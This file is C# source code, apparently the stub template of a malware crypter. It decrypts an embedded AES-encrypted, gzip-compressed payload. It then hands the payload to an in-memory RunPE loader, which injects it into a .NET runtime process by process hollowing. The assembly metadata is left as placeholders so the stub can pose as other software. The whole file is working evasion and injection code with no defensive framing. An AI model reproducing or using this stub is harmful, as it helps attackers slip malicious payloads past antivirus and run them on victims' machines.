using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;


[assembly: AssemblyTitle("#AssemblyTitle#")]
[assembly: AssemblyDescription("#AssemblyDescriptions#")]
[assembly: AssemblyConfiguration("#AssemblyConfigurations#")]
[assembly: AssemblyCompany("#AssemblyCompany#")]
[assembly: AssemblyProduct("#AssemblyProduct#")]
[assembly: AssemblyCopyright("#AssemblyCopyright#")]
[assembly: AssemblyTrademark("#AssemblyTrademark#")]
[assembly: AssemblyVersion("999.998.997.996")]
[assembly: AssemblyFileVersion("999.998.997.996")]

namespace Stub
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
            string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";

            RunPe(Decompress(Decrypt(payloadAesCompressStub, passwordAesCompressStub)));
        }

        private static void RunPe(byte[] data)
        {
            string codeRunPe = "#CodeRunPE#";
            string passwordRunPe = "#PasswordRunPE#";
            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#PathProcess#");

            Assembly runpeLoader =
                Assembly.Load(Decompress(Decrypt(codeRunPe, passwordRunPe)));

            MethodInfo mi = runpeLoader.GetType("#NamespaceRunpe#.#ClassRunpe#").GetMethod("#MethodsRunPE#");
            object[] parameters = { pathProcess, data };
            mi.Invoke(null, parameters);
        }

        public static byte[] Decrypt(string encryptedText, string key)
        {
            byte[] encryptedBytes = Convert.FromBase64String(encryptedText);
            using (AesManaged aes256 = new AesManaged())
            {
                using (SHA256CryptoServiceProvider sha256Hash = new SHA256CryptoServiceProvider())
                {
                    byte[] hash = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(key));
                    aes256.KeySize = 256;
                    aes256.BlockSize = 128;
                    aes256.Key = hash.Take(aes256.KeySize / 8).ToArray();
                    aes256.IV = hash.Take(aes256.BlockSize / 8).ToArray();
                    aes256.Mode = CipherMode.CBC;
                    byte[] decryptedBytes;

                    using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes256.CreateDecryptor(),
                                   CryptoStreamMode.Read))
                        {
                            using (MemoryStream tempStream = new MemoryStream())
                            {
                                byte[] buffer = new byte[1024];
                                int read;
                                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    tempStream.Write(buffer, 0, read);
                                }

                                decryptedBytes = tempStream.ToArray();
                            }
                        }
                    }

                    return decryptedBytes;
                }
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                    {
                        gzipStream.CopyTo(decompressedStream);
                    }

                    return decompressedStream.ToArray();
                }
            }
        }
    }
}